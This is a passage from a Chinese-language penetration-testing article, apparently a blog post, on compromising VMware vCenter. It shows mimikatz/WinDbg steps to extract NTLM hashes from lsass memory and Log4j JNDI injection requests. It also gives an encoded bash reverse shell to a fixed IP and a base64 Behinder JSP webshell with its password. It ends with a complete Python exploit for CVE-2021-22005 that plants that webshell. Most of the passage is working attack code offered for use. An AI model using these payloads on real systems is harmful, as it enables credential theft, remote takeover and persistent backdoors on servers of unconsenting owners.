+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">安装过程没什么难的，就不说了。<br>
+装好后点击左上角“文件”，然后按图所示一次打开dmp文件：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134831-e44353c8-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+然后找到mimikatz的安装目录，加载mimilib.dll:<br>
+给出mimikatz的下载链接：</p></div><div class="el-pre"><pre><code data-line="0">https://github.com/gentilkiwi/mimikatz/releases
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre><code data-line="0">.load D:\Tools\Analysis Tools\mimikatz\x64\mimilib.dll
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134845-ec3e8c0a-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+然后重新加载：</p></div><div class="el-pre"><pre><code data-line="0">.reload
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134856-f3119f22-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+查看lsass.exe进程的内存地址</p></div><div class="el-pre"><pre><code data-line="0">!process 0 0 lsass.exe
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134909-fa77c980-2f91-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+换到lsass.exe进程中</p></div><div class="el-pre"><pre><code data-line="0">.process /r /p ffffe001c2ddf080
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134920-0100603c-2f92-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+运行mimikatz，得到NTLM哈希值：</p></div><div class="el-pre"><pre><code data-line="0">!mimikatz
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621134932-08abd582-2f92-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+后续就是验证hash，横向了。</p></div><div class="el-h2"><h2 data-heading="4 log4j2 注意事项" dir="auto" class="heading" id="4_log4j2_注意事项_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>4 log4j2 注意事项</h2></div><div class="el-p"><p dir="auto">注意这里有个坑，不能盲目使用Poc：<br>
+如果访问https://ip:port，跳转到了某个域名链接，那么/SSO/后面跟的就是该域名domain.com，如：<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621135034-2d28c258-2f92-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></p></div><div class="el-pre"><pre><code data-line="0">GET /websso/SAML2/SSO/domain.com?SAMLRequest= HTTP/1.1
+Host: 10.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+X-Forwarded-For: ${jndi:ldap://x.x.x.x:1389/TomcatBypass/TomcatEcho}
+cmd: whoami
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">否则就是vsphere.local</p></div><div class="el-pre"><pre><code data-line="0">GET  HTTP/1.1
+Host: 10.1.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+X-Forwarded-For: ${jndi:ldap://x.x.x.x:1389/TomcatBypass/TomcatEcho}
+cmd: whoami
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">说白了，就是使用正确的URL。</p></div><div class="el-p"><p dir="auto">反弹shell可以使用</p></div><div class="el-pre"><pre><code data-line="0">echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4zLjEuMS8zMzMzMyAwPiYx | base64 -d |bash
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">这样子操作不太方便，不想进行添加用户/写公钥等复杂操作的话，我们写入冰蝎马：<br>
+路径为：</p></div><div class="el-pre"><pre><code data-line="0">/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">命令为：</p></div><div class="el-pre"><pre><code data-line="0">echo -n c3VjY2VzcyE8JUBwYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YXguY3J5cHRvLiosamF2YXguY3J5cHRvLnNwZWMuKiIlPjwlIWNsYXNzIFUgZXh0ZW5kcyBDbGFzc0xvYWRlcntVKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO31wdWJsaWMgQ2xhc3MgZyhieXRlIFtdYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsMCxiLmxlbmd0aCk7fX0lPjwlaWYgKHJlcXVlc3QuZ2V0TWV0aG9kKCkuZXF1YWxzKCJQT1NUIikpe1N0cmluZyBrPSJlNDVlMzI5ZmViNWQ5MjViIjtzZXNzaW9uLnB1dFZhbHVlKCJ1IixrKTtDaXBoZXIgYz1DaXBoZXIuZ2V0SW5zdGFuY2UoIkFFUyIpO2MuaW5pdCgyLG5ldyBTZWNyZXRLZXlTcGVjKGsuZ2V0Qnl0ZXMoKSwiQUVTIikpO25ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGMuZG9GaW5hbChuZXcgc3VuLm1pc2MuQkFTRTY0RGVjb2RlcigpLmRlY29kZUJ1ZmZlcihyZXF1ZXN0LmdldFJlYWRlcigpLnJlYWRMaW5lKCkpKSkubmV3SW5zdGFuY2UoKS5lcXVhbHMocGFnZUNvbnRleHQpO30lPg== | base64 -d  &gt; pgtest.jsp
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621135057-3b488b0c-2f92-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+然后访问：<br>
+<a rel="noopener nofollow" class="external-link is-unresolved" href="https://10.x.x.x/idm/..;/pgtest.jsp" target="_self">https://10.x.x.x/idm/..;/pgtest.jsp</a><br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621135111-435b6b0c-2f92-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+冰蝎连接，密码是rebeyond<br>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240621135125-4bc40452-2f92-1.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"><br>
+接下来就是上面获取Cookie的重复操作了。</p></div><div class="el-p"><p dir="auto">附cve-2021-22005exp:</p></div><div class="el-pre"><pre><code data-line="0"># -*- coding: utf-8 -*-
+import requests
+import random
+import string
+import sys
+import time
+import requests
+import urllib3
+import argparse
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
+ return ''.join(random.choice(chars) for _ in range(size))
+
+def escape(_str):
+ _str = _str.replace("&amp;", "&amp;amp;")
+ _str = _str.replace("&lt;", "&amp;lt;")
+ _str = _str.replace("&gt;", "&amp;gt;")
+ _str = _str.replace("\"", "&amp;quot;")
+ return _str
+
+def str_to_escaped_unicode(arg_str):
+ escaped_str = ''
+ for s in arg_str:
+   val = ord(s)
+   esc_uni = "\\u{:04x}".format(val)
+   escaped_str += esc_uni
+ return escaped_str
+
+def createAgent(target, agent_name, log_param):
+
+ url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&amp;_i=%s" % (target, agent_name, log_param)
+ headers = { "Cache-Control": "max-age=0", 
+       "Upgrade-Insecure-Requests": "1", 
+       "User-Agent": "Mozilla/5.0", 
+       "X-Deployment-Secret": "abc", 
+       "Content-Type": "application/json", 
+       "Connection": "close" }
+
+ json_data = { "manifestSpec":{}, 
+        "objectType": "a2",
+        "collectionTriggerDataNeeded": True,
+        "deploymentDataNeeded":True, 
+        "resultNeeded": True, 
+        "signalCollectionCompleted":True, 
+        "localManifestPath": "a7",
+        "localPayloadPath": "a8",
+        "localObfuscationMapPath": "a9" }
+
+ requests.post(url, headers=headers, json=json_data, verify=False)
+
+def generate_manifest(webshell_location, webshell):
+
+ manifestData = """&lt;manifest recommendedPageSize="500"&gt;
+   &lt;request&gt;
+    &lt;query name="vir:VCenter"&gt;
+      &lt;constraint&gt;
+       &lt;targetType&gt;ServiceInstance&lt;/targetType&gt;
+      &lt;/constraint&gt;
+      &lt;propertySpec&gt;
+       &lt;propertyNames&gt;content.about.instanceUuid&lt;/propertyNames&gt;
+       &lt;propertyNames&gt;content.about.osType&lt;/propertyNames&gt;
+       &lt;propertyNames&gt;content.about.build&lt;/propertyNames&gt;
+       &lt;propertyNames&gt;content.about.version&lt;/propertyNames&gt;
+      &lt;/propertySpec&gt;
+    &lt;/query&gt;
+   &lt;/request&gt;
+   &lt;cdfMapping&gt;
+    &lt;indepedentResultsMapping&gt;
+      &lt;resultSetMappings&gt;
+       &lt;entry&gt;
+         &lt;key&gt;vir:VCenter&lt;/key&gt;
+         &lt;value&gt;
+                      &lt;value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping"&gt;
+            &lt;resourceItemToJsonLdMapping&gt;
+             &lt;forType&gt;ServiceInstance&lt;/forType&gt;
+            &lt;mappingCode&gt;&lt;![CDATA[  
+             #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
+             #set($orig_log = $appender.getFile())##
+             #set($logger = $GLOBAL-logger.logger.parent)##  
+             $appender.setFile("%s")##  
+             $appender.activateOptions()## 
+             $logger.warn("%s")## 
+             $appender.setFile($orig_log)##  
+             $appender.activateOptions()##]]&gt;
+            &lt;/mappingCode&gt;
+            &lt;/resourceItemToJsonLdMapping&gt;
+          &lt;/value&gt;
+         &lt;/value&gt;
+       &lt;/entry&gt;
+      &lt;/resultSetMappings&gt;
+    &lt;/indepedentResultsMapping&gt;
+   &lt;/cdfMapping&gt;
+   &lt;requestSchedules&gt;
+    &lt;schedule interval="1h"&gt;
+      &lt;queries&gt;
+       &lt;query&gt;vir:VCenter&lt;/query&gt;
+      &lt;/queries&gt;
+    &lt;/schedule&gt;
+   &lt;/requestSchedules&gt;
+ &lt;/manifest&gt;""" % (webshell_location, webshell)
+
+ return manifestData
+
+def arg():
+ parser = argparse.ArgumentParser()
+ parser.add_argument("-t", "--target", help = "Target", required = True)
+ args = parser.parse_args()
+ target = args.target
+ print("[*] Target: %s" % target)
+ return target
+
+def exec():
+ target = arg()
+ # Variables
+ webshell_param = id_generator(6)
+ log_param = id_generator(6)
+ agent_name = id_generator(6)
+ shell_name = "test.jsp"
+ #webshell = """&lt;% out.println("test");%&gt;"""
+ webshell = """&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;"""
+
+ webshell_location = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % shell_name
+ webshell = str_to_escaped_unicode(webshell)
+ manifestData = generate_manifest(webshell_location,webshell)
+ print("[*] Creating Agent")
+ createAgent(target, agent_name, log_param)
+ url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&amp;_c=%s&amp;_i=%s" % (target, agent_name, log_param)
+ headers = {"Cache-Control": "max-age=0", 
+          "Upgrade-Insecure-Requests": "1", 
+          "User-Agent": "Mozilla/5.0", 
+          "X-Deployment-Secret": "abc", 
+          "Content-Type": "application/json", 
+          "Connection": "close"}
+ json_data ={"contextData": "a3", "manifestContent": manifestData, "objectId": "a2"}
+ requests.post(url, headers=headers, json=json_data, verify=False)
+ #webshell
+ url = "%s/idm/..;/%s" % (target, shell_name)
+ code = requests.get(url=url, headers=headers,verify=False).status_code
+ if code != "404":
+   print("shell: %s" % url)
+   print("password: rebeyond" )
+
+ else:
+   print("not found test.jsp")
+
+if __name__ == '__main__':
+ exec()
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">参考：<br>
+<a rel="noopener nofollow" class="external-link is-unresolved" href="https://daidaitiehanhan.github.io/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/#%E5%90%8E%E6%B8%97%E9%80%8F" target="_self">https://daidaitiehanhan.github.io/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/#%E5%90%8E%E6%B8%97%E9%80%8F</a><br>
+<a rel="noopener nofollow" class="external-link is-unresolved" href="https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%976-vCenter-SAML-Certificates" target="_self">https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%976-vCenter-SAML-Certificates</a><br>
+<a data-tooltip-position="top" aria-label="https://mp.weixin.qq.com/s/4JF0Hyqt38JW1VeCAG1qOg?version=4.1.26.6024&amp;platform=win&amp;nwr_flag=1#wechat_redirect" rel="noopener nofollow" class="external-link is-unresolved" href="https://mp.weixin.qq.com/s/4JF0Hyqt38JW1VeCAG1qOg?version=4.1.26.6024&amp;platform=win&amp;nwr_flag=1#wechat_redirect" target="_self">https://mp.weixin.qq.com/s/4JF0Hyqt38JW1VeCAG1qOg?version=4.1.26.6024&amp;platform=win&amp;nwr_flag=1#wechat_redirect</a></p></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"></div></div></div></body></html>
